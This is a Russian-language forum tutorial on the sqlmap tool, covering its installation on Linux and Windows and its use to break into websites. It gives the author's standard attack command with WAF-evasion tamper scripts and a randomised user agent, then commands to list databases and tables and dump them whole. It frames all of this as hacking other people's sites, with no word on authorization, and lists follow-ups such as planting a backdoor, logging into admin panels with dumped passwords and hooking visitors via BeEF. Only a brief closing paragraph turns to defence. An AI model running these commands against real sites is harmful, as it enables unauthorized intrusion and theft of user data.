Программа sqlmap позволяет проверять сайты на наличие в них уязвимости SQL-инъекция, уязвимости XSS, а также эксплуатировать SQL-инъекцию. Поддерживаются разнообразные типы SQL-инъекций и разнообразные базы данных.

Вообще. Инструмент очень серъезный, и при должной подготовке вы сможете щелкать порядком 85% всех сайтов.
Однако, не забываем, что sqlmap щелкает только те сайты, что имеют уязвимость в одном из направлений: xss, sql(i).
Потому процент я выставляю из числа уязвимых сайтов.

С помощью sqlmap можно:
  • проверять, имеется ли в сайтах уязвимость
Если сайт уязвим к SQL-инъекции, то возможно:
  • получать информацию из базы данных, в том числе дамп (всю) базу данных
  • изменять и удалять информацию из базы данных
  • заливать шелл (бэкдор) на веб-сервер
Один из сценариев использования sqlmap:
  • Получение имени пользователя и пароля из базы данных
  • Поиск панелей администрирования сайта (админок)
  • Вход в админку с полученным логином и паролем

При наличии уязвимости атака может развиваться по различным направлениям:
  • Модификация данных
  • Заливка бэкдора
  • Внедрение JavaScript кода для получения данных пользователей
  • Внедрение кода для подцепления на BeEF

Программу написана на питоне.
Имеет лишь одну зависимость - питон.
Что позволяет нам установить её на любом девайсе.

Linux
На любом дистрибутиве нам нужно будет поставить лишь пару пакетных программ.
Код: 
yum install git python2 python3
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev/
python sqlmap.py

Прикладываю скрин, ибо у меня есть CentOS.
apt-get install git python2 python3
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev/
python sqlmap.py

Windows
В случае с видной есть небольшие трудности, но не всё так критично.
Нам по-прежнему нужно поставить лишь Python.
Скачиваем и устанавливаем Python2

Установка крайне простая. Даже не вижу смысла её описывать.
После Скачиваем сам sqlmap с github, распаковываем.

Как видим, у нас уже файлы расширения .py ассоциированы к питону. Но, не всё так просто.
Если мы сейчас запустим просто файл sqlmap.py, у нас запустится окно с программой, и сразу же закроется.
Нам нужно работать напрямую с консоли.
Однако, python не интегрируется в Shell Windows, потому будем использовать его как прикладное ПО.
Запускаем консоль и переходим в директорию, где установлен Питон.
Или же открываем в Проводнике папку с питоном, зажимаешь Shift+ПКМ по пустому месту > Запустить cmd(Windows PowerShell) здесь.

У меня PowerShell мервтый, потому буду использовать обычный cmd.

После, обращаемся к питону напряму.
Пишем: python.exe
После, уже нужно указать исполняемую программу.
Чтобы руками не писать полный путь, делаем проще.
Перетаскиваем файл sqlmap.py в консоль после того, написали python.exe

Система сама пропишет путь к файлу.



Для удобства в работе с Windows я отдельно написал простеньку программку - SQLMAP Launcher

Собственно, всё.
Программу мы поставили.
Теперь её использование.
Я могу переписывать гигансткие куски чужих статей, где объясняют каждый параметр программы, но я этого делать конечно-же не буду.
Я опишу лишь основные параметры, который использую я.
Сперва, давайте разберем Payload программы, который обычно всегда использую я.
То есть, это конфиг программы ,который я всегда использую при взломе.
Он выглядит так:
Код: 
sqlmap.py -u [ССЫЛКА] --risk=3 --level=3 --threads=3 --beep --no-cast --dbs  tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --random-agent
  • --risk=РИСК Риск выполняемого тестирования (1-3, по умолчанию 1)
  • --level=УРОВЕНЬ Уровень выполнения тестирования (1-5, по умолчанию 1)
  • --threads=ПОТОКИ Максимальное количество одновременных HTTP(s) запросов (по умолчанию 1)
  • --beep Сигнал на вопрос и/или когда найдена SQL инъекция
  • --no-cast Отключить механизм отбора полезной нагрузки
  • --dbs Перечислить базы данных СУБД
  • --tamper=TAMPER Использовать данный скрипт(ы) для обфускации инъекционных данных
Самый главный параметр в этой строке - dbs.
Он покажет нам все базы данных, которые будут найдены в сайте после взлома.
Без указания этого параметра, мы просто взломаем сайт. Но данные не получим. И толку, да?
Предположим, взломали сайт. Базы получили.
Дальше что?
А дальше нам нужно получить таблицы, и их строки.
Код: 
sqlmap.py -u [ССЫЛКА] -D [НАЗВАНИЕ БАЗЫ] --tables
Программа нам выведет все таблицы в определенной базе.
Далее, колонки.
Код: 
sqlmap.py -u [ССЫЛКА] -D [НАЗВАНИЕ БАЗЫ] -T [НАЗВАНИЕ ТАБЛИЦЫ] --columns dump
Нам будет сдамлпена вся таблица из базы данных.

Вообще. Можно не парится, и дампит всё подряд.
Но, это займет достаточное кол-во времени.
Я привык взламывать целенаправленно.
Но, если у вас много времени, дампим все колонки в базе.
Код: 
sqlmap.py -u [ССЫЛКА] -D [НАЗВАНИЕ БАЗЫ] --dump-all

Самое главное. Как защититься от взлома?
На самом деле, SQL инъекции - крайне старый способ взлома.
САмый простой вариант - переписать код сайта (используя библиотеку для подключения к бд) или же использовать короткие ЧПУ ссылки.
Либо воспользоваться софтом, который будет сам закрывать дыры (Таких, увы, нет).
Если быть откровенным, мало сайтов (Особенно CMS), где есть SQL дыры.
Как правило, это сайты 2005-2013 годов.
